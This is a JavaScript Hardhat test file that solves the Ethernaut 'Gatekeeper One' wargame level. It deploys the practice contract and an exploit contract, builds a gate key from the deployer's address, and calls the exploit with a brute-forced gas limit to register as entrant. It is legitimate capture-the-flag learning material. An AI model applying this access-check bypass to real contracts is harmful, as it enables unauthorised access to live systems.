const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { utils } = require("ethers");

describe("Ethernaut - Thirteen", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautThirteenGatekeeperOne = await ethers.getContractFactory(
      "EthernautThirteenGatekeeperOne"
    );
    const ethernautThirteenGatekeeperOne =
      await EthernautThirteenGatekeeperOne.deploy();
    await ethernautThirteenGatekeeperOne.deployed();

    const EthernautThirteenGatekeeperOneExploit =
      await ethers.getContractFactory("EthernautThirteenGatekeeperOneExploit");
    const ethernautThirteenGatekeeperOneExploit =
      await EthernautThirteenGatekeeperOneExploit.deploy(
        ethernautThirteenGatekeeperOne.address
      );
    await ethernautThirteenGatekeeperOneExploit.deployed();

    return {
      deployer,
      ethernautThirteenGatekeeperOne,
      ethernautThirteenGatekeeperOneExploit,
    };
  }

  describe("Exploit", function () {
    it("Successfully registered as entrant", async function () {
      const {
        deployer,
        ethernautThirteenGatekeeperOne,
        ethernautThirteenGatekeeperOneExploit,
      } = await loadFixture(deployToken);

      expect(await ethernautThirteenGatekeeperOne.entrant()).to.equal(
        ethers.constants.AddressZero
      );

      const gateKey = `0x100000000000${deployer.address.slice(38)}`;

      // brute forced this gasLimit :D
      await ethernautThirteenGatekeeperOneExploit
        .connect(deployer)
        .exploit(gateKey, { gasLimit: 108087 });

      expect(await ethernautThirteenGatekeeperOne.entrant()).to.equal(
        deployer.address
      );
    });
  });
});
